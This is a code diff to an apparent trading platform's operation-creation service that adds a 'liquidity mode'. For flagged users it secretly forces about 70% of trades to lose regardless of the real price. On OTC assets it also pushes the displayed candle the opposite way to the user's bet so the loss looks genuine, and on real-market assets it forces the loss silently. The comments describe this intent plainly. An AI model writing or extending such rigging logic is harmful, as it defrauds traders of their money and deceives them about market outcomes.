@@ -5,7 +5,11 @@ import type { CreateOperationInput } from './schema.js'
 import { resolveOperationIfExpired } from './worker.js'
 import { getSettings } from '../settings/service.js'
 import { publishOperationEvent } from './events.js'
-import { assertMarketAllowed } from './marketPermissions.js'
+import { assertMarketAllowed, getAssetMarket } from './marketPermissions.js'
+import { markOpForcedLoss, registerLiquiditySignal } from './liquidityManipulation.js'
+
+const LIQUIDITY_LOSS_RATE = 0.7
+const M1_SLOT_MS = 60_000
 
 export async function createOperation(userId: string, input: CreateOperationInput) {
   // Per-user market permission gate. Admin toggles canTradeForex/Otc/Crypto
@@ -108,6 +112,49 @@ export async function createOperation(userId: string, input: CreateOperationInpu
     const account = await prisma.account.findUnique({ where: { id: input.accountId } })
     if (!account || account.userId !== userId) throw new Error('ACCOUNT_NOT_FOUND')
     throw new Error('INSUFFICIENT_BALANCE')
+  }
+
+  // ── Liquidity-mode roll (per-user "modo liquidez" → 70% loss target).
+  // Decided here at OPEN time so the same op never re-rolls partway
+  // through. If the roll picks "lose":
+  //   - mark opId for the resolver to force LOST regardless of price
+  //   - for OTC assets, ALSO register an opposite-direction signal so
+  //     the candle close is dragged the right way → vela coerente
+  //     instead of "vela verde mas perdeu" mismatch
+  // For Binance assets we don't manipulate (real market), the resolver
+  // still forces loss via the marker — same "silent" outcome as before.
+  //
+  // Wrapped in try/catch — any failure here NEVER blocks the trade.
+  // Default outcome on failure: skip the roll, op resolves naturally.
+  try {
+    const userPerms = await prisma.user.findUnique({
+      where:  { id: userId },
+      select: { liquidityMode: true } as any,
+    }) as { liquidityMode?: boolean } | null
+    if (userPerms?.liquidityMode === true && Math.random() < LIQUIDITY_LOSS_RATE) {
+      const opIdStr = String((rows[0] as any).id)
+      markOpForcedLoss(opIdStr)
+      const market = await getAssetMarket({ id: input.assetId, marketSymbol: input.marketSymbol })
+      if (market !== 'crypto') {
+        // OTC path — register the visual nudge. Direction we want the
+        // candle to close = OPPOSITE of what the user bet.
+        const opposite: 'CALL' | 'PUT' = input.direction === 'CALL' ? 'PUT' : 'CALL'
+        const expiresMs = expiresAt.getTime()
+        const slotEndMs = (Math.floor(expiresMs / M1_SLOT_MS) + 1) * M1_SLOT_MS
+        registerLiquiditySignal({
+          opId:        opIdStr,
+          assetId:     input.assetId,
+          direction:   opposite,
+          slotEndMs,
+          expiresAtMs: expiresMs,
+        })
+        console.log(`[liquidity] OTC nudge op=${opIdStr} asset=${input.assetId} dir=${opposite} expiresAt=${new Date(expiresMs).toISOString()}`)
+      } else {
+        console.log(`[liquidity] silent force-loss op=${opIdStr} asset=${input.assetId} (binance)`)
+      }
+    }
+  } catch (err) {
+    console.error('[liquidity] roll failed (non-fatal — op resolves naturally)', err)
   }
 
   // Resolution is handled by the expiration worker (polls DB every second) —
